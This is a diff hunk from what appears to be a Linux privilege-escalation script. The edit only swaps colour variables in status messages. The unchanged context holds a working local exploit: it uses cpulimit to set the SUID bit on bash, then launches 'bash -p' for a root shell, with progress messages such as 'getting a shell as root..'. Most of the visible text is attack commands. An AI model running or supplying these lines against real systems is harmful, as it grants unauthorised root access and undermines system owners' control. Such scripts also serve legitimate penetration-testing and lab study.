@@ -27,10 +27,10 @@ echo -e "$az$cu2 $b check PATH bash: $r$p1$nc"
 sleep 2
 echo -e "$az$cu2 $b check PATH cpulimit: $r$p2$nc"
 sleep 2
-echo -e "$v$cu3 $b granting SUID permissions to: $r$p1$nc"
+echo -e "$v$cu1 $b granting SUID permissions to: $r$p1$nc"
 sleep 2
 $p2 -l 100 -f chmod +s $p1
-echo -e "$v$cu3 $b getting a shell as root.. $nc"
+echo -e "$v$cu1 $b getting a shell as root.. $nc"
 sleep 2
 $p1 -p
 echo ""
